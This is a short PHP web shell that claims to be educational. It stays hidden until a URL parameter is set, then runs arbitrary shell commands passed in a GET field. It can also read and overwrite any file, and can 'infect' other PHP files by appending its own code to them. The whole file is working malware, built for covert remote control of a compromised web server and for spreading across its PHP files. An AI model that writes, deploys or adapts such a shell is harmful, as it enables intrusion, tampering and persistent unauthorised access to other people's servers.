<?php
/* 
This tool was made by Nitescu Lucian | nliplace.com in educational purposes only and was released under the GPLv3 license!

Disclaimer:
The creator of this script known as Nitescu Lucian can not be held responsible for any kind of ilegal/legal use!

*/
$hide = $_GET["hidden"];

if ($hide == 1){
    $message=shell_exec('pwd');
    if ($message <> NULL) {
    echo "<pre>$message</pre>";
    }
    $message=shell_exec('ls -al');
    if ($message <> NULL) {
    echo "<pre>$message</pre>";
    }
    $message = NULL;
    $file = NULL;
    $cod = NULL;
    $infectare=0;
    ?>
    <html>
        
    <body>
        <hr>
        <form action="kokken.php" method="get">
        Visible (1/0):<input type="text" name="hidden" value="1"> 
        Infect PHP (1/0 ~ Requiers .php file):<input type="text" name="infect" value="0"><br>
        Command:<input type="text" name="cmd"><br>
        File Name:<input type="text" name="file"><br>
        String:<input type="text" name="cod"><br>
        <input type="submit" >
        </form>
        <hr>
    </body>
    
    </html>
    
    <?php
    $hide = $_GET["hidden"];
    $infectare = $_GET["infect"];
    $fisier= $_GET["file"];
    $cods= $_GET["cod"];
    $to_fuck= $_GET["cmd"];
    $message=shell_exec($to_fuck);
    if ($message <> NULL) {
    echo "<pre>$message</pre>";
    }
    if ($fisier <> NULL) {
        if ($cods <> NULL){
            $current = file_get_contents($fisier);
            echo $current;
            $current = $cods;
            file_put_contents($fisier, $current);
        } else {
             if ($infectare == 1){
                $current = file_get_contents($fisier);
                $current .= file_get_contents('kokken.php');
                file_put_contents($fisier, $current);
             }
             else {
                $current = file_get_contents($fisier);
                echo "<pre>$current</pre>";
             }
         }
    }
}
?>  

